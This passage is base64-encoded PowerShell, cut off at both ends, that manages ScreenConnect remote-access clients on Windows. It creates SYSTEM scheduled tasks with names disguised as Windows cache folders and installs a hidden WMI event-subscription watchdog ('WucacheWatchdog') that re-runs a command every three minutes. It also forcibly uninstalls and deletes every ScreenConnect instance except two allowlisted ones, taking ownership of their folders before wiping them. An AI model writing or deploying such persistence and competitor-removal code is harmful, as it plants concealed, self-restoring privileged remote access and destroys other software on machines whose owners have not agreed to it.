YWlsID0gMAogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9IFtzdHJp
bmddJGlkWyRzcC5LZXldCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7ICRmYWlsKys7IGNvbnRpbnVl
IH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsg
Y29udGludWUgfQogICAgICAgICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAkdG4KICAgICAg
ICAkZXhpc3RzID0gW2Jvb2xdJGJsb2IKICAgICAgICBpZiAoJGV4aXN0cykgewogICAgICAgICAg
ICAjIExlYXZlIHJlYWwgV2luZG93cyB0YXNrcyBhbG9uZS4gT25seSByZXBsYWNlIGlmIHRoaXMg
d2FzIGFscmVhZHkgb3VyIGFjdGlvbi4KICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2Ig
LW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNh
Y2hlXFwnKQogICAgICAgICAgICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBjb250
aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgJHRuCiAgICAgICAgfQogICAgICAg
ICRhcmdzID0gQCgnL0NyZWF0ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcs
ICdISUdIRVNUJywgJy9GJywgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYykKICAgICAgICBp
ZiAoJHNwLlNjIC1lcSAnTUlOVVRFJyAtYW5kICRzcC5NbykgeyAkYXJncyArPSBAKCcvTU8nLCAk
c3AuTW8pIH0KICAgICAgICAmIHNjaHRhc2tzLmV4ZSBAYXJncyAyPiYxIHwgT3V0LU51bGwKICAg
ICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgewogICAgICAgICAgICAk
cmVhcm1lZCsrCiAgICAgICAgICAgIGlmICgkc3AuS2V5IC1lcSAnVEFTS19BJyAtb3IgJHNwLktl
eSAtZXEgJ1RBU0tfQicpIHsKICAgICAgICAgICAgICAgICYgc2NodGFza3MuZXhlIC9SdW4gL1RO
ICR0biAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7ICRmYWls
KysgfQogICAgfQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWls
PSRmYWlsIgp9CgpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgewogICAgZm9yZWFjaCAoJGNscyBp
biBAKCdfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nJywnX19FdmVudEZpbHRlcicsJ0NvbW1hbmRM
aW5lRXZlbnRDb25zdW1lcicsJ19fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uJykpIHsKICAgICAg
ICBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3Qg
ewogICAgICAgICAgICAgICAgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgk
Xy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9nQycpIC1vcgogICAgICAgICAgICAgICAgKCRfLlRp
bWVySWQgLWVxICdXdWNhY2hlV2F0Y2hkb2cnKSAtb3IKICAgICAgICAgICAgICAgICgkXy5GaWx0
ZXIgLWFuZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykg
LW9yCiAgICAgICAgICAgICAgICAoJF8uQ29uc3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmlu
ZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nQyonKQogICAgICAgICAgICB9IHwgRm9yRWFjaC1P
YmplY3QgeyAkXy5EZWxldGUoKSB8IE91dC1OdWxsIH0KICAgIH0KfQoKZnVuY3Rpb24gSW5zdGFs
bC1XYXRjaGRvZyB7CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICAg
IFJlbW92ZS1XYXRjaGRvZwogICAgJG9rID0gJHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdt
aUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxU
aW1lckluc3RydWN0aW9uIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1
Y2FjaGVXYXRjaGRvZyc7IEludGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNz
ZWQgPSAkZmFsc2UgfSB8IE91dC1OdWxsCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5h
bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAg
ICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3Bh
Y2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAg
ICAgICAgICAgICBRdWVyeSA9ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1l
cklkPSdXdWNhY2hlV2F0Y2hkb2cnIiB9CiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5h
bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVy
IGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBD
b21tYW5kTGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJh
Y3RpdmVseSA9ICRmYWxzZSB9CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9v
dFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAg
ICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVs
bAogICAgfSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9u
IFRlc3QtV2F0Y2hkb2dHcmFwaCB7CiAgICAkdCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gLUZpbHRl
ciAiVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICRmID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1D
bGFzcyBfX0V2ZW50RmlsdGVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0YnIiAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3Bh
Y2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmls
dGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICRiID0gJG51bGwKICAgIGlmICgkZiAtYW5kICRjKSB7CiAgICAgICAgJGIgPSBHZXQt
V21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9D
b25zdW1lckJpbmRpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAg
ICBXaGVyZS1PYmplY3QgeyAkXy5GaWx0ZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicgLWFu
ZCAkXy5Db25zdW1lciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJyB9IHwKICAgICAgICAgICAg
U2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRm
IC1hbmQgJGMgLWFuZCAkYikKfQoKZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsKICAgIGlmIChU
ZXN0LVdhdGNoZG9nR3JhcGgpIHsgcmV0dXJuICdPSycgfQogICAgaWYgKC1ub3QgJE1vblBhdGgp
IHsgcmV0dXJuICdNSVNTSU5HJyB9CiAgICBpZiAoSW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4g
J1JFQVJNRUQnIH0KICAgIHJldHVybiAnRkFJTCcKfQoKIyBDb3JyZWN0IDMyLWJpdCArIDY0LWJp
dCBBUlAgaGl2ZXMuIEw2IGFuZCBlYXJsaWVyIHVzZWQgYSB0cnVuY2F0ZWQKIyBXT1c2NDMyTm9k
ZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29mdFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJv
ZHVjdAojIHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4dGVybWluYXRlL3JlZ2lzdGVyZWQuCiRz
Y3JpcHQ6VW5pbnN0YWxsUm9vdHMgPSBAKAogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxX
aW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsCiAgICAnSEtMTTpcU09GVFdBUkVcV09X
NjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJwopCgpm
dW5jdGlvbiBUZXN0LVNDUmVnaXN0ZXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBM
ODogTkVWRVIgdXNlIHJldHVybiBpbnNpZGUgRm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRz
IHRoZQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZl
bGwgdGhyb3VnaCB0byAnbm8nCiAgICAjIGFuZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRl
ZCBoZWFsdGh5IHJlZ2lzdGVyZWQgc2VydmljZXMuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQp
IHsgcmV0dXJuICdubycgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5n
ZXJwcmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7
CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAg
IGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXku
UFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAg
ICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1l
IC1saWtlICd7Kn0nKSkgeyByZXR1cm4gJ3llcycgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVy
biAnbm8nCn0KCmZ1bmN0aW9uIFJlcGFpci1TQ1NlcnZpY2UoW3N0cmluZ10kRmluZ2VycHJpbnQp
IHsKICAgICMgUmVjcmVhdGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmlu
ZyB0aGUgUkVHSVNURVJFRCBwcm9kdWN0LgogICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWly
cyBpbiBwbGFjZSAtIGl0IGRvZXMgTk9UIHJ1biB0aGUgU0MtZmFtaWx5CiAgICAjIG1ham9yLXVw
Z3JhZGUgcmVtb3ZhbCwgc28gb3RoZXIgaW5zdGFuY2VzIGFyZSB1bnRvdWNoZWQuCiAgICAjIEw1
OiBhbHNvIGhhbmRsZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3Rv
cmVzIGJpbmFyaWVzLAogICAgIyB0aGVuIHN0YXJ0KS4gT25seSBhIFJ1bm5pbmcgc2VydmljZSBp
cyBjb25zaWRlcmVkIGhlYWx0aHkuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJu
ICduby1mcCcgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmlu
dCkiCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykg
eyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9CiAgICAkZ3VpZCA9ICRudWxsCiAgICBmb3JlYWNoICgk
cm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3Qt
UGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1D
aGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAg
ICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAt
aWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyAkZ3VpZCA9
ICRrZXkuUFNDaGlsZE5hbWU7IGJyZWFrIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRndWlkKSB7
IGJyZWFrIH0KICAgIH0KICAgIGlmICgtbm90ICRndWlkKSB7IHJldHVybiAnbm90LXJlZ2lzdGVy
ZWQnIH0KICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
b2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAog
ICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91
dC1OdWxsCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICJtc2lfcmVwYWlyXyRGaW5nZXJw
cmludC5sb2ciCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlz
dCAiL2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhy
dQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgOAogICAgJiBzYy5leGUgY29uZmlnICIkbmFtZSIg
c3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+
JjEgfCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNAogICAgJHN2YyA9IEdldC1T
ZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAo
JHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9y
ZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQogICAgaWYgKCRzdmMpIHsgcmV0dXJuICJzdmMtc3Rp
bGwtc3RvcHBlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICByZXR1cm4gInN2Yy1zdGlsbC1t
aXNzaW5nIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCn0KCmZ1bmN0aW9uIEludm9rZS1FeHRlcm1pbmF0
ZSB7CiAgICAjIEw3OiB0cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5vZGUgaGl2ZSArIG1z
aWV4ZWMgKyBVbmluc3RhbGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIgbnVrZS4g
S2VlcCBvbmx5IHRoZSB0d28gYWxsb3dsaXN0ZWQgZmluZ2VycHJpbnRzLgogICAgJGxvZyA9IEpv
aW4tUGF0aCAkV29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJwogICAgJGtlZXAgPSBAKCc1ZjYwMTA1
Nzk4NTJlNTA3JywnZjg2MWM4MTQwZDQ1MzQyNycpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2Mg
PSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rp
b24gTG9nKFtzdHJpbmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURh
dGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50
IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgICAgIFdyaXRlLU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24gSXMtS2Vl
cGVyKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0K
ICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJl
dHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5jdGlvbiBG
b3JjZS1SZW1vdmVEaXIoW3N0cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1vciAtbm90
IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIEdl
dC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5F
eGVjdXRhYmxlUGF0aC5TdGFydHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJ
Z25vcmVDYXNlKSB9IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVByb2Nlc3Mg
LUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQog
ICAgICAgICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAg
ICAmIGljYWNscy5leGUgJGQgL2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9RIDI+JjEg
fCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3Jz
OkYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFs
UGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBjbWQuZXhl
IC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1OdWxs
CiAgICAgICAgfQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAg
ICAgICAgICRlbXB0eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlk
XTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlw
ZSBEaXJlY3RvcnkgLVBhdGggJGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgICAgICYg
cm9ib2NvcHkuZXhlICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwKICAg
ICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRo
ICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAg
IH0KICAgICAgICByZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkKICAgIH0K
ICAgIGZ1bmN0aW9uIFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAkZ3VpZCA9
ICRrZXkuUFNDaGlsZE5hbWUKICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJGtleS5Q
U1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAkcHJvcC5E
aXNwbGF5TmFtZQogICAgICAgIGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAgICAgICAk
cCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3Fu
IC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRv
d1N0eWxlIEhpZGRlbgogICAgICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlk
PSRndWlkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0Q29kZSAt
aW4gMCwgMTYwNSwgMTYxNCwgMzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0KICAgICAg
ICAkdXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAgICAgICAg
ICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7
CiAgICAgICAgICAgICAgICAgICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4qbXNpZXhl
YyhcLmV4ZSk/XHMqJywgJycpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRj
aCAnL3FuJykgeyAkYXJncyA9ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAgICAgICAg
ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICRhcmdz
IC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAg
TG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2Rl
KSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAx
NjE0LCAzMDEwKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAk
cCA9IFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1MgL3NpbGVu
dCAvcXVpZXQgL3FuIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAg
ICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9
JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29kZSAt
ZXEgMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVj
dF91bmluc3RhbGxzdHJpbmdfRkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAgICByZXR1
cm4gJGZhbHNlCiAgICB9CgogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVnaW4nCgog
ICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBoaXZlcwog
ICAgJHNlZW4gPSBAe30KICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9v
dHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlz
c2luZyAkcm9vdCI7IGNvbnRpbnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9vdCIKICAg
ICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
Rm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJF8u
UFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRkbiA9ICRw
cm9wLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQogICAg
ICAgICAgICBpZiAoJGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypc
KChbMC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9ICRNYXRj
aGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4g
fQogICAgICAgICAgICBpZiAoJHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUpKSB7IHJl
dHVybiB9CiAgICAgICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAgICAgICAg
ICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsg
JG4uZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAgICAgIH0K
ICAgIH0KCiAgICAjIDIuIGZvcmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRzdmMgaW4g
KEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0
IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAgICAgIGlm
IChJcy1LZWVwZXIgJHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4ZSBzdG9w
ICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxs
aXNlY29uZHMgNjAwCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEg
fCBPdXQtTnVsbAogICAgICAgICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2Yy5OYW1l
KSIKICAgIH0KCiAgICAjIDMuIGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4gd2hlbiBF
